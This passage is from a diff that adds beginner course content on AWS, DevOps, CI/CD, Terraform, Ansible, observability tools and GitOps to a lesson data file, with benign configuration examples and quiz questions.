+- **EBS** — block storage. Like a virtual hard disk attached to an EC2 instance.
+
+**Database:**
+- **RDS** — managed relational databases (PostgreSQL, MySQL). AWS handles backups, patches, failover.
+- **DynamoDB** — managed NoSQL. Very fast, scales automatically.
+
+**Networking:**
+- **VPC** — your private network in the cloud
+- **Route 53** — DNS service
+- **CloudFront** — CDN (content delivery network)
+
+**The serverless shift:**
+Traditional: EC2 + RDS + load balancer (you manage scaling)
+Serverless: Lambda + DynamoDB + API Gateway (AWS manages scaling)
+
+{question}
+Your app gets 100 requests per day. Which is cheaper?
+a) A t3.medium EC2 running 24/7 ($30/month)
+b) Lambda functions ($0.0000002 per request)
+c) Both cost the same
+
+answer: b
+explanation: 100 requests/day = 3,000/month. At $0.0000002 per request, that is $0.0006/month. The EC2 instance costs $30/month even when idle. Lambda wins for low-traffic apps.`
+      },
+      {
+        titleEn: "VPC Networking",
+        contentEn: `A VPC (Virtual Private Cloud) is your own private network inside AWS.
+
+**Key components:**
+- **Subnets** — slices of your network
+  - Public subnet: has a route to the internet (for web servers)
+  - Private subnet: no direct internet access (for databases)
+- **Internet Gateway** — the door to the internet
+- **NAT Gateway** — lets private resources reach the internet (for updates) without being reachable from the internet
+- **Security Groups** — firewall rules per resource (allow port 443 from anywhere, allow port 5432 only from the web server)
+- **Route Tables** — traffic rules (this subnet goes to the internet gateway, that subnet goes to the NAT)
+
+**Typical architecture:**
+\`\`\`
+Internet
+   |
+Internet Gateway
+   |
+[Public Subnet]
+  - Load Balancer
+  - NAT Gateway
+   |
+[Private Subnet]
+  - Web servers (EC2)
+  - API servers
+   |
+[Private Subnet]
+  - Database (RDS)
+  - Cache (ElastiCache)
+\`\`\`
+
+**Security layers:**
+1. Security Groups (instance level) — stateful firewall
+2. Network ACLs (subnet level) — stateless firewall
+3. Private subnets (network level) — no public IP at all
+
+**Rule of thumb:** Put only load balancers in public subnets. Everything else goes in private subnets.`
+      },
+      {
+        titleEn: "High Availability & Chaos Engineering",
+        contentEn: `Cloud does not mean "never fails." It means "designed to survive failures."
+
+**Multi-AZ (Availability Zones):**
+- Each AWS region has 2-6 AZs
+- An AZ is a separate data center (own power, cooling, network)
+- Deploy your app across 2+ AZs
+- If one AZ goes down, the others keep running
+
+**Design rules:**
+- Stateless servers (no data stored on the server itself)
+- Database replication across AZs (RDS Multi-AZ)
+- Load balancer distributes traffic to healthy instances
+- Auto Scaling Group replaces failed instances
+
+**The Netflix Chaos Monkey story:**
+In 2011, Netflix moved to AWS. They asked: "What if servers randomly die?"
+Instead of hoping it would not happen, they built Chaos Monkey — a tool that randomly kills production servers during business hours.
+
+Why? Because:
+- If your system survives random server deaths, it can survive real outages
+- Engineers are forced to build resilient systems
+- Problems are found on Tuesday at 2 PM (when everyone is awake), not Saturday at 3 AM
+
+**Chaos Monkey rules:**
+- Only runs during business hours
+- Only kills one instance at a time
+- The team gets alerts and can see what happened
+
+**The result:** When AWS had a major outage in 2012, Netflix stayed up while other companies went down. Their systems were trained to survive failure.
+
+{thinkOutside}
+Your company runs a web app on 2 EC2 instances in one AZ. The CEO says "we never had downtime, why pay for Multi-AZ?"
+
+What is wrong with this thinking? What would you say to the CEO?
+
+Key points:
+- "We never had downtime" = we were lucky, not resilient
+- A single AZ failure takes down everything
+- The cost of Multi-AZ is small compared to the cost of hours of downtime
+- Netflix did not wait for failure — they practiced for it`
+      }
+    ]
+  },
+
+  205: {
+    titleEn: "DevOps Philosophy & CI/CD",
+    pages: [
+      {
+        titleEn: "What is DevOps?",
+        contentEn: `DevOps is a culture change, not just a set of tools.
+
+**The old way (before DevOps):**
+- Developers write code and throw it "over the wall" to Operations
+- Operations deploy it and deal with problems
+- Blame game: "It works on my machine!" vs "Your code crashed the server!"
+- Releases happen every few months. Each release is scary.
+
+**The DevOps way:**
+- Dev and Ops work together as one team
+- "You build it, you run it" — developers are responsible for their code in production
+- Releases happen many times per day. Each release is small and safe.
+- Automation replaces manual work
+
+**The CALMS framework:**
+- **C**ulture — collaboration, shared responsibility, no blame
+- **A**utomation — CI/CD, Infrastructure as Code, monitoring
+- **L**ean — small batches, fast feedback, reduce waste
+- **M**easurement — measure everything (deploy frequency, failure rate, recovery time)
+- **S**haring — share knowledge, tools, and on-call duties
+
+**Key metrics (DORA):**
+- Deployment frequency → how often you release
+- Lead time for changes → from commit to production
+- Change failure rate → % of releases that cause problems
+- Mean time to recovery (MTTR) → how fast you fix problems
+
+**Elite teams:** deploy multiple times per day, lead time < 1 hour, failure rate < 5%, recovery < 1 hour.`
+      },
+      {
+        titleEn: "CI/CD with GitHub Actions",
+        contentEn: `CI/CD automates the path from code to production.
+
+**CI (Continuous Integration):**
+- Every push triggers automatic tests
+- Catch bugs in minutes, not days
+- Merge small changes often (not big merges once a month)
+
+**CD (Continuous Delivery / Deployment):**
+- Delivery: code is always ready to deploy (one-click)
+- Deployment: code is automatically deployed after tests pass
+
+**GitHub Actions example:**
+\`\`\`yaml
+# .github/workflows/ci.yml
+name: CI Pipeline
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+      - run: npm install
+      - run: npm test
+      - run: npm run lint
+
+  deploy:
+    needs: test
+    if: github.ref == 'refs/heads/main'
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: docker build -t myapp .
+      - run: docker push myapp:latest
+      - run: kubectl apply -f k8s/
+\`\`\`
+
+**Key ideas:**
+- **on: push** — triggers on every push
+- **needs: test** — deploy only runs after tests pass
+- **if: github.ref == 'refs/heads/main'** — only deploy from main branch
+- Pull requests run tests but do not deploy
+
+{question}
+A developer pushes code. Tests pass but the deploy step fails. What happens?
+a) The broken code goes to production
+b) The code stays in the branch, production is not affected
+c) GitHub reverts the commit automatically
+d) All previous deployments are rolled back
+
+answer: b
+explanation: The deploy step failed, so the new code never reached production. The old version keeps running. This is the safety net of CI/CD.`
+      },
+      {
+        titleEn: "Terraform: Infrastructure as Code",
+        contentEn: `Terraform lets you define infrastructure in code files instead of clicking in a web console.
+
+**Why IaC?**
+- Reproducible: run the same code → get the same infrastructure
+- Version controlled: git log shows who changed what and when
+- Reviewable: infrastructure changes go through pull requests
+- Fast: create 50 servers in seconds, not hours of clicking
+
+**Terraform basics:**
+\`\`\`hcl
+# main.tf
+provider "aws" {
+  region = "us-east-1"
+}
+
+resource "aws_instance" "web" {
+  ami           = "ami-0c55b159cbfafe1f0"
+  instance_type = "t3.micro"
+
+  tags = {
+    Name = "web-server"
+  }
+}
+
+resource "aws_s3_bucket" "data" {
+  bucket = "my-app-data-bucket"
+}
+\`\`\`
+
+**Terraform workflow:**
+1. \`terraform init\` — download provider plugins
+2. \`terraform plan\` — show what will change (add, modify, destroy)
+3. \`terraform apply\` — make the changes
+4. \`terraform destroy\` — delete everything
+
+**The plan step is critical.** It shows you exactly what will happen before anything changes. Like a "dry run."
+
+**State file:**
+Terraform keeps a state file (terraform.tfstate) that tracks what it created. This is how it knows what exists and what needs to change. Never edit this file by hand.`
+      },
+      {
+        titleEn: "Ansible: Configuration Management",
+        contentEn: `Terraform creates servers. Ansible configures them.
+
+**What Ansible does:**
+- Install software on 100 servers at once
+- Copy config files to every server
+- Restart services after a config change
+- Ensure all servers are in the same state
+
+**How it works:**
+- Agentless: connects via SSH (no software to install on target servers)
+- Playbooks: YAML files that describe the desired state
+- Idempotent: run it 10 times, same result (safe to repeat)
+
+**Example playbook:**
+\`\`\`yaml
+# setup-web.yml
+- hosts: webservers
+  become: yes
+  tasks:
+    - name: Install nginx
+      apt:
+        name: nginx
+        state: present
+
+    - name: Copy config file
+      copy:
+        src: nginx.conf
+        dest: /etc/nginx/nginx.conf
+      notify: restart nginx
+
+    - name: Ensure nginx is running
+      service:
+        name: nginx
+        state: started
+        enabled: yes
+
+  handlers:
+    - name: restart nginx
+      service:
+        name: nginx
+        state: restarted
+\`\`\`
+
+**Terraform vs Ansible:**
+| | Terraform | Ansible |
+|---|---|---|
+| Purpose | Create infrastructure | Configure servers |
+| Language | HCL | YAML |
+| State | Stateful (state file) | Stateless |
+| Best for | Cloud resources | Server setup |
+
+**They work together:** Terraform creates 10 EC2 instances → Ansible installs and configures your app on all 10.
+
+{simulation}
+You need to set up a production environment:
+1. Terraform creates: VPC, 3 EC2 instances, RDS database, S3 bucket
+2. Ansible connects to the 3 EC2 instances and: installs Docker, pulls the app image, starts the container, configures log rotation
+3. GitHub Actions runs on every push: tests → build → push image → Ansible deploys
+
+This is the modern DevOps pipeline: IaC + Configuration Management + CI/CD.`
+      }
+    ]
+  },
+
+  206: {
+    titleEn: "Observability Fundamentals",
+    pages: [
+      {
+        titleEn: "The Three Pillars of Observability",
+        contentEn: `Observability means understanding what your system is doing from the outside.
+
+**Three pillars:**
+
+**1. Metrics — numbers over time**
+- CPU usage: 45% → 78% → 92%
+- Request count: 1,200 per minute
+- Error rate: 0.3%
+- Response time: p99 = 250ms
+- Metrics answer: "Is something wrong right now?"
+
+**2. Logs — detailed event records**
+- \`2024-03-15 10:23:45 ERROR: Database connection refused\`
+- \`2024-03-15 10:23:46 WARN: Retrying connection (attempt 2/3)\`
+- \`2024-03-15 10:23:47 INFO: Connection restored\`
+- Logs answer: "What exactly happened?"
+
+**3. Traces — follow a request across services**
+- User clicks "Buy" → API gateway → auth service → order service → payment → email
+- Each step has a timing: auth took 12ms, payment took 340ms
+- Traces answer: "Where is the bottleneck?"
+
+**Why all three?**
+- Metric alert: "Error rate jumped to 5%"
+- Logs: "Database connection timeout errors on service-B"
+- Trace: "Requests that hit service-B → database take 8 seconds instead of 50ms"
+- Root cause: the database server ran out of connections
+
+One pillar alone cannot solve the puzzle. You need all three.`
+      },
+      {
+        titleEn: "Prometheus & Grafana",
+        contentEn: `Prometheus collects metrics. Grafana makes them visual.
+
+**Prometheus:**
+- Pull-based: Prometheus asks your app "what are your metrics?" every 15 seconds
+- Your app exposes metrics at /metrics endpoint
+- Time-series database: stores metric values over time
+- Alert rules: "If error_rate > 5% for 5 minutes, alert the team"
+
+**How apps expose metrics:**
+\`\`\`
+# GET /metrics
+http_requests_total{method="GET", status="200"} 15234
+http_requests_total{method="POST", status="500"} 12
+http_request_duration_seconds{quantile="0.99"} 0.25
+node_cpu_usage_percent 67.3
+\`\`\`
+
+**Grafana:**
+- Connects to Prometheus (and other data sources)
+- Builds dashboards with charts, graphs, and alerts
+- Common panels: time series, gauge, stat, table, heatmap
+- Share dashboards with the team
+
+**A typical dashboard shows:**
+- Request rate (requests per second)
+- Error rate (% of 5xx responses)
+- Latency (p50, p95, p99)
+- CPU, memory, disk usage
+- Active database connections
+
+**The RED method (for services):**
+- **R**ate — how many requests per second?
+- **E**rrors — how many of those fail?
+- **D**uration — how long do they take?
+
+{question}
+Prometheus scrapes metrics every 15 seconds. Your app crashes and restarts in 5 seconds. Will Prometheus notice?
+a) Yes, it checks every 15 seconds so it will see the restart
+b) No, the crash happened between scrapes
+c) It depends on the metrics
+d) Both a and b are possible
+
+answer: d
+explanation: If Prometheus scrapes right during the crash, it will see a failed scrape (target down). If the app restarts before the next scrape, Prometheus might miss it. This is why logs and traces complement metrics.`
+      },
+      {
+        titleEn: "SLI, SLO, and SLA",
+        contentEn: `These three terms define reliability in measurable ways.
+
+**SLI (Service Level Indicator):**
+- A metric that measures user experience
+- Examples:
+  - Request latency: p99 = 200ms
+  - Availability: 99.95% of requests succeed
+  - Error rate: 0.1% of requests return 5xx
+
+**SLO (Service Level Objective):**
+- Your internal target for an SLI
+- "99.9% of requests will complete in under 300ms"
+- "99.95% availability per month"
+- This is what your team promises to achieve
+
+**SLA (Service Level Agreement):**
+- A contract with customers
+- Includes consequences: "If we drop below 99.9% uptime, we give you a credit"
+- SLA is always less strict than SLO (you need a safety margin)
+
+**Example:**
+- SLI: actual uptime last month = 99.97%
+- SLO: internal goal = 99.95%
+- SLA: contract with customers = 99.9%
+
+**Error budget:**
+- SLO = 99.9% → you can have 0.1% downtime per month
+- 0.1% of 30 days = 43 minutes of allowed downtime
+- If you still have error budget left → deploy new features
+- If error budget is used up → freeze releases, focus on reliability
+
+**The key insight:** 100% is not the goal. If you have zero downtime, you are probably not releasing fast enough. The error budget balances speed and reliability.`
+      },
+      {
+        titleEn: "ELK Stack & Postmortem Culture",
+        contentEn: `**ELK Stack — centralized logging:**
+
+- **E**lasticsearch — stores and indexes logs (search engine)
+- **L**ogstash — collects, transforms, and ships logs
+- **K**ibana — visualize and search logs in a web UI
+
+**How it works:**
+1. Your apps write logs (stdout, files)
+2. A log shipper (Filebeat) sends them to Logstash
+3. Logstash parses and enriches the logs
+4. Elasticsearch stores them (searchable)
+5. Kibana lets you search: "show all errors from payment-service in the last hour"
+
+**Why centralized logging?**
+- 50 servers × 10 log files = 500 files to search manually
+- ELK: one search bar to find any log from any server
+
+**Postmortem culture:**
+When something breaks, you write a postmortem — a document that asks:
+1. **What happened?** (timeline of events)
+2. **What was the impact?** (users affected, duration)
+3. **Why did it happen?** (root cause, not blame)
+4. **How did we detect it?** (monitoring? customer complaint?)
+5. **What will we do to prevent it?** (action items with owners and deadlines)
+
+**Rules of a good postmortem:**
+- Blameless: "The deploy script had no rollback" NOT "John deployed bad code"
+- Focused on systems: "How do we make this impossible?" not "Who made the mistake?"
+- Shared publicly within the company → everyone learns
+
+{thinkOutside}
+Your payment service was down for 45 minutes last night. The on-call engineer fixed it by restarting the database. The CEO asks: "Who is responsible?"
+
+How would you run a blameless postmortem?
+
+Key approach:
+- Focus on: "Why did the database need restarting? What caused the state that led to the crash?"
+- Not: "Who forgot to check the database?"
+- Action items: add database connection pool monitoring, add auto-restart on high connection count, improve the runbook for database issues`
+      }
+    ]
+  },
+
+  207: {
+    titleEn: "Infrastructure as Code (Deep Dive)",
+    pages: [
+      {
+        titleEn: "What is Infrastructure as Code?",
+        contentEn: `IaC means managing servers, networks, and services through code files instead of manual clicks.
+
+**The problem (before IaC):**
+- An engineer clicks through the AWS console to create a server
+- Nobody knows exactly what settings were used
+- Creating a second identical server? Good luck remembering every click
+- "Snowflake servers" — each one is slightly different
+
+**The IaC solution:**
+- Write code that describes your infrastructure
+- Store the code in Git (version history, reviews, rollbacks)
+- Run the code → infrastructure is created exactly the same every time
+
+**Benefits:**
+- **Reproducible** — dev, staging, and production are identical
+- **Auditable** — git log shows every change and who made it
+- **Fast** — create 100 servers in minutes
+- **Self-documenting** — the code IS the documentation
+- **Testable** — validate infrastructure before applying changes
+
+**Types of IaC tools:**
+| Tool | Type | Use |
+|---|---|---|
+| Terraform | Provisioning | Create cloud resources |
+| CloudFormation | Provisioning | AWS-only, same idea |
+| Ansible | Configuration | Set up software on servers |
+| Pulumi | Provisioning | IaC in real programming languages |
+
+**Key principle:** Never make changes by hand. If it is not in the code, it does not exist.`
+      },
+      {
+        titleEn: "Terraform HCL Language",
+        contentEn: `HCL (HashiCorp Configuration Language) is Terraform's language. It is declarative — you describe what you want, not how to build it.
+
+**Core building blocks:**
+
+**Provider** — which cloud to use:
+\`\`\`hcl
+provider "aws" {
+  region = "us-east-1"
+}
+\`\`\`
+
+**Resource** — something to create:
+\`\`\`hcl
+resource "aws_instance" "web" {
+  ami           = "ami-0c55b159cbfafe1f0"
+  instance_type = "t3.micro"
+  subnet_id     = aws_subnet.public.id
+}
+\`\`\`
+
+**Variable** — input parameters:
+\`\`\`hcl
+variable "instance_count" {
+  type    = number
+  default = 2
+}
+\`\`\`
+
+**Output** — values to show after apply:
+\`\`\`hcl
+output "server_ip" {
+  value = aws_instance.web.public_ip
+}
+\`\`\`
+
+**Data source** — read existing resources:
+\`\`\`hcl
+data "aws_ami" "ubuntu" {
+  most_recent = true
+  filter {
+    name   = "name"
+    values = ["ubuntu/images/hvm-ssd/ubuntu-22*"]
+  }
+}
+\`\`\`
+
+**References:**
+- \`aws_subnet.public.id\` — reference another resource's attribute
+- \`var.instance_count\` — reference a variable
+- \`data.aws_ami.ubuntu.id\` — reference a data source
+
+{question}
+What does \`aws_instance.web.public_ip\` mean in Terraform?
+a) A hardcoded IP address
+b) The public IP of the resource named "web" of type "aws_instance"
+c) A variable named public_ip
+d) An AWS API call
+
+answer: b
+explanation: Terraform creates a resource graph. \`aws_instance.web\` refers to the resource block, and \`.public_ip\` is an attribute that AWS returns after the instance is created.`
+      },
+      {
+        titleEn: "Terraform State Management",
+        contentEn: `State is Terraform's memory. It tracks what resources exist and their current configuration.
+
+**What the state file contains:**
+- Every resource Terraform created
+- Their IDs, IPs, and settings
+- The mapping between your code and the real world
+
+**Local state (default):**
+- Saved as \`terraform.tfstate\` in your project folder
+- Problem: only one person can use it at a time
+- Problem: if you lose the file, Terraform forgets everything
+
+**Remote state (production):**
+\`\`\`hcl
+terraform {
+  backend "s3" {
+    bucket         = "my-terraform-state"
+    key            = "prod/terraform.tfstate"
+    region         = "us-east-1"
+    dynamodb_table = "terraform-locks"
+    encrypt        = true
+  }
+}
+\`\`\`
+
+**Why remote state?**
+- **Shared access** — the whole team uses the same state
+- **Locking** — DynamoDB prevents two people from changing infra at the same time
+- **Encryption** — state can contain secrets (passwords, keys)
+- **Backup** — S3 has versioning, so you can recover old state
+
+**State commands:**
+- \`terraform state list\` — show all tracked resources
+- \`terraform state show aws_instance.web\` — show details of one resource
+- \`terraform import aws_instance.web i-1234567\` — import an existing resource into state
+
+**Golden rule:** Never edit the state file manually. Use \`terraform state\` commands or \`terraform import\`.`
+      },
+      {
+        titleEn: "Cattle vs Pets",
+        contentEn: `This is the most important mental shift in DevOps.
+
+**Pets (the old way):**
+- Each server has a name: "db-master", "web-prod-01"
+- You log in to fix problems manually
+- If a server dies, you panic and try to repair it
+- Servers are unique and irreplaceable
+- Like a pet: you name it, care for it, and cry when it is sick
+
+**Cattle (the DevOps way):**
+- Servers are numbered: instance-001, instance-002
+- You never log in to fix anything — you replace the server
+- If a server dies, automation creates a new one in seconds
+- Servers are identical and disposable
+- Like cattle: any one can be replaced by another
+
+**How to treat servers as cattle:**
+1. **IaC** — create any server from code in minutes
+2. **Immutable infrastructure** — never update a server, deploy a new one
+3. **Configuration management** — Ansible ensures all servers are identical
+4. **Auto Scaling** — automatically add or remove servers
+5. **Health checks** — kill unhealthy servers, create healthy ones
+
+**Story: The Production Database Server**
+A company had one database server called "Big Bertha." It ran for 4 years. Nobody dared restart it. Nobody knew exactly how it was configured. When it finally crashed, recovery took 3 days.
+
+After the incident, they:
+- Automated the database setup with Terraform + Ansible
+- Set up RDS Multi-AZ (managed database with auto-failover)
+- Tested failover every month
+
+Now their database is cattle. If it dies, AWS creates a new one in 60 seconds.
+
+{thinkOutside}
+Look at your own projects. Which of your servers or services are "pets"? How would you turn them into "cattle"?
+
+Think about:
+- Can you recreate the server from scratch in under 10 minutes?
+- Is every configuration step documented in code?
+- Would you be comfortable if someone deleted the server right now?`
+      }
+    ]
+  },
+
+  208: {
+    titleEn: "Monitoring & Observability (Deep Dive)",
+    pages: [
+      {
+        titleEn: "The Metrics-Logs-Traces Triangle",
+        contentEn: `Each pillar of observability serves a different purpose in debugging.
+
+**Metrics — the alert system**
+- Aggregate numbers: averages, percentiles, counts
+- Cheap to store (just numbers over time)
+- Good for: dashboards, alerts, capacity planning
+- Weakness: tells you THAT something is wrong, not WHY
+
+**Logs — the detail system**
+- Text records of events with timestamps
+- Expensive to store (text is large)
+- Good for: debugging specific errors, audit trails
+- Weakness: hard to see patterns across millions of log lines
+
+**Traces — the flow system**
+- Follow one request across multiple services
+- Medium cost to store
+- Good for: finding slow services, understanding dependencies
+- Weakness: sampling needed at high traffic (you cannot trace every request)
+
+**How they work together (incident example):**
+
+| Step | Pillar | Action |
+|---|---|---|
+| 1 | Metric | Alert: "p99 latency > 2 seconds" |
+| 2 | Trace | Look at slow traces → payment-service takes 1.8s |
+| 3 | Logs | Read payment-service logs → "Connection pool exhausted" |
+| 4 | Metric | Check connection pool metric → maxed out at 20/20 |
+| Root cause | — | Connection pool too small for current traffic |
+| Fix | — | Increase pool size from 20 to 50 |
+
+**Key tools:**
+- Metrics: Prometheus, Datadog, CloudWatch
+- Logs: ELK Stack, Loki, Splunk
+- Traces: Jaeger, Zipkin, Tempo
+- All-in-one: Datadog, New Relic, Grafana Cloud`
+      },
+      {
+        titleEn: "PromQL Query Language",
+        contentEn: `PromQL is the query language for Prometheus. It lets you ask questions about your metrics.
+
+**Basic queries:**
+\`\`\`promql
+# Current value of a metric
+http_requests_total
+
+# Filter by label
+http_requests_total{status="500"}
+
+# Filter by multiple labels
+http_requests_total{method="POST", status="500"}
+\`\`\`
+
+**Rate — the most important function:**
+\`\`\`promql
+# Requests per second over the last 5 minutes
+rate(http_requests_total[5m])
+
+# Error rate (errors / total requests)
+rate(http_requests_total{status="500"}[5m])
+  / rate(http_requests_total[5m])
+\`\`\`
+
+**Aggregation:**
+\`\`\`promql
+# Total requests per second across all instances
+sum(rate(http_requests_total[5m]))
+
+# Requests per second, grouped by status code
+sum by (status) (rate(http_requests_total[5m]))
+
+# Average CPU across all pods
+avg(container_cpu_usage_seconds_total)
+\`\`\`
+
+**Percentiles:**
+\`\`\`promql
+# 99th percentile latency
+histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m]))
+\`\`\`
+
+**Alert rule example:**
+\`\`\`yaml
+- alert: HighErrorRate
+  expr: rate(http_requests_total{status="500"}[5m]) > 0.05
+  for: 5m
+  labels:
+    severity: critical
+  annotations:
+    summary: "Error rate above 5% for 5 minutes"
+\`\`\`
+
+{question}
+What does \`rate(http_requests_total[5m])\` measure?
+a) The total number of HTTP requests ever made
+b) The number of requests in the last 5 minutes
+c) The average requests per second over the last 5 minutes
+d) The maximum request count in 5 minutes
+
+answer: c
+explanation: \`rate()\` calculates the per-second average rate of increase over the given time window. A [5m] window means it looks at the last 5 minutes of data to compute a smooth per-second rate.`
+      },
+      {
+        titleEn: "Grafana Dashboards",
+        contentEn: `Grafana turns metrics into visual dashboards that anyone can understand.
+
+**Dashboard design principles:**
+- Top row: key business metrics (revenue, active users)
+- Second row: system health (error rate, latency, uptime)
+- Lower rows: detailed infrastructure (CPU, memory, disk, network)
+- Use colors: green = healthy, yellow = warning, red = critical
+
+**Common panel types:**
+- **Time series** — metrics over time (request rate, CPU usage)
+- **Stat** — single big number (current error rate: 0.2%)
+- **Gauge** — progress bar (disk usage: 73%)
+- **Table** — list of data (top 10 slowest endpoints)
+- **Heatmap** — density over time (request latency distribution)
+- **Alert list** — currently firing alerts
+
+**The USE method (for infrastructure):**
+- **U**tilization — how full is the resource? (CPU at 85%)
+- **S**aturation — is there a queue? (10 requests waiting)
+- **E**rrors — any failures? (disk I/O errors)
+
+**Dashboard variables:**
+Use dropdown filters to make dashboards flexible:
+- Environment: dev / staging / production
+- Service: api / web / worker
+- Time range: last 1h / 6h / 24h / 7d
+
+**Best practices:**
+- Every team should have a "service overview" dashboard
+- Link alerts to the relevant dashboard
+- Include runbook links: "If this alert fires, follow these steps"
+- Review dashboards monthly — remove panels nobody looks at`
+      },
+      {
+        titleEn: "Story: The Memory Leak",
+        contentEn: `**The setup:**
+A team launched a new microservice. Everything looked fine on day one.
+
+**Day 1:** Memory usage: 200 MB. No alerts. All green.
+
+**Day 3:** Memory usage: 600 MB. Still under the 1 GB limit. Nobody noticed.
+
+**Day 5:** Memory usage: 950 MB. Prometheus alert fires: "memory usage > 90%."
+The on-call engineer sees the alert but restarts the service. Memory drops to 200 MB. Problem "solved."
+
+**Day 7:** Memory hits 1 GB again. The service crashes. Kubernetes restarts it. But during the 30-second restart, 200 requests fail.
+
+**Day 8 — the real investigation:**
+The team opens Grafana and looks at the memory panel over 7 days. They see a clear pattern: memory grows by ~100 MB per day and never goes down.
+
+This is a memory leak — the code allocates memory but never frees it.
+
+**Finding the root cause:**
+1. Grafana showed memory growing linearly (not spiky → leak, not load)
+2. Logs showed no errors (the leak was silent)
+3. A trace showed that every request to /api/reports created a cache entry that was never cleaned up
+4. The fix: add cache expiration (TTL of 1 hour)
+
+**Lessons learned:**
+- Restarting a service hides the problem, it does not fix it
+- Memory graphs over days/weeks reveal leaks that short time windows miss
+- Every cache must have an expiration policy
+- The postmortem led to a new alert: "If memory grows > 10% per day for 3 days, alert"
+
+{simulation}
+You see this pattern in Grafana:
+- CPU: flat at 30% (no issue)
+- Memory: 200 MB → 400 MB → 600 MB → 800 MB over 4 days
+- Request rate: constant at 100 req/s (no traffic change)
+- Error rate: 0% (no errors yet)
+
+What is happening? What would you do?
+
+Steps:
+1. The linear memory growth with constant traffic = memory leak
+2. Do not restart — that hides the problem
+3. Add memory profiling to the service
+4. Check for: unclosed connections, growing caches, event listeners not removed
+5. Fix the code, deploy, and watch the memory graph flatten`
+      }
+    ]
+  },
+
+  209: {
+    titleEn: "GitOps",
+    pages: [
+      {
+        titleEn: "Git as the Source of Truth",
+        contentEn: `GitOps is a way of managing infrastructure and deployments where Git is the single source of truth.
+
+**The core idea:**
+- The desired state of your system is stored in a Git repository
+- Any change to the system goes through a Git commit
+- An automated tool watches the repo and makes reality match the repo
+
+**Traditional deployment:**
+1. Developer pushes code
+2. CI builds an image
+3. Someone runs \`kubectl apply\` manually (or CI does it)
+4. Problem: what is actually running in production? You have to check the cluster.
+
+**GitOps deployment:**
+1. Developer pushes code
+2. CI builds an image and updates the image tag in the Git repo
+3. A GitOps tool (ArgoCD) detects the change and syncs the cluster
+4. What is running in production? Check the Git repo. It is always accurate.
+
+**Benefits:**
+- **Audit trail** — every change is a git commit with author, timestamp, and message
+- **Easy rollback** — revert a commit → system rolls back automatically
+- **Security** — developers never need direct access to the cluster
+- **Consistency** — Git is the truth, not what someone typed in a terminal
+- **Pull-based** — the cluster pulls changes from Git (safer than pushing to the cluster)
+
+**GitOps principles:**
+1. The entire system is described declaratively (YAML)
+2. The desired state is stored in Git
+3. Changes are applied automatically after approval
+4. Software agents ensure the actual state matches the desired state`
+      },
+      {
+        titleEn: "ArgoCD: The GitOps Loop",
+        contentEn: `ArgoCD is the most popular GitOps tool for Kubernetes.
+
+**How ArgoCD works (the loop):**
+
+\`\`\`
+[Git Repository]
+    |
+    | (1) ArgoCD watches for changes
+    v
+[ArgoCD Server]
+    |
+    | (2) Compares: Git state vs Cluster state
+    v
+[Kubernetes Cluster]
+    |
+    | (3) If different → sync (apply changes)
+    | (4) If same → do nothing
+    |
+    └──→ (5) Report status back to ArgoCD UI
+\`\`\`
+
+**Key concepts:**
+- **Application** — an ArgoCD resource that links a Git repo to a K8s namespace
+- **Sync** — the act of making the cluster match Git
+- **Health status** — is the app running correctly?
+- **Sync status** — does the cluster match Git?
+
+**Sync statuses:**
+- **Synced** — cluster matches Git (all good)
+- **OutOfSync** — cluster does not match Git (a change is pending)
+- **Unknown** — ArgoCD cannot determine the state
+
+**Auto-sync vs manual sync:**
+- Auto-sync: ArgoCD applies changes immediately when Git changes
+- Manual sync: ArgoCD detects the diff but waits for human approval
+- Best practice: auto-sync for dev/staging, manual sync for production
+
+{question}
+A developer pushes a new image tag to the GitOps repo. ArgoCD shows "OutOfSync." What does this mean?
+a) The deployment failed
+b) The Git repo has changes that are not yet applied to the cluster
+c) The cluster has changes that are not in Git
+d) ArgoCD is broken
+
+answer: b
+explanation: "OutOfSync" means the desired state (Git) is different from the actual state (cluster). ArgoCD detected the new image tag in Git but has not applied it yet. If auto-sync is on, it will apply shortly. If manual, someone needs to click "Sync."`
+      },
+      {
+        titleEn: "Drift Detection",
+        contentEn: `Drift happens when the actual state of your system does not match the desired state in Git.
+
+**How drift happens:**
+- Someone runs \`kubectl edit deployment\` directly on the cluster
+- A script changes a config outside of the GitOps process
+- A cloud resource is modified through the web console
+- An automated process (like HPA) changes replica counts
+
+**Why drift is dangerous:**
+- You think production has version 2.3 (because Git says so)
+- But someone manually deployed version 2.4 last night
+- Now your rollback goes to 2.3, skipping unknown changes in 2.4
+- Debugging becomes impossible: "It works in Git but not in production"
+
+**How ArgoCD detects drift:**
+1. ArgoCD reads the desired state from Git
+2. ArgoCD reads the actual state from the K8s API
+3. It compares them field by field
+4. Any difference = drift → status becomes "OutOfSync"
+5. ArgoCD can show you a visual diff (like git diff)
+
+**Handling drift:**
+- **Auto-heal (self-heal):** ArgoCD automatically reverts manual changes
+- **Alert:** notify the team that someone made a manual change
+- **Ignore:** some fields (like replica count from HPA) should be excluded from drift detection
+
+**Best practice: enable self-heal.**
+If someone makes a manual change, ArgoCD reverts it within seconds. This enforces the rule: all changes must go through Git. No exceptions.
+
+{thinkOutside}
+Your team has self-heal enabled. A senior engineer manually scales a deployment from 3 to 10 replicas during a traffic spike. ArgoCD reverts it to 3 within seconds.
+
+Was ArgoCD right to revert it? How should the engineer handle this situation properly?
+
+The correct approach:
+- The engineer should update the Git repo (change replicas to 10, or adjust HPA settings)
+- Push the commit → ArgoCD syncs → replicas go to 10
+- This takes 2-3 minutes but maintains the GitOps process
+- For emergencies: some teams exclude replica count from drift detection and let HPA manage it
+- Alternative: have an "emergency override" process that commits to Git automatically`
+      }
+    ]
+  },
 
   // ========== RESEARCH TRACK (301-308) — titles only ==========
   301: { titleEn: "Wireshark Analysis", pages: [] },
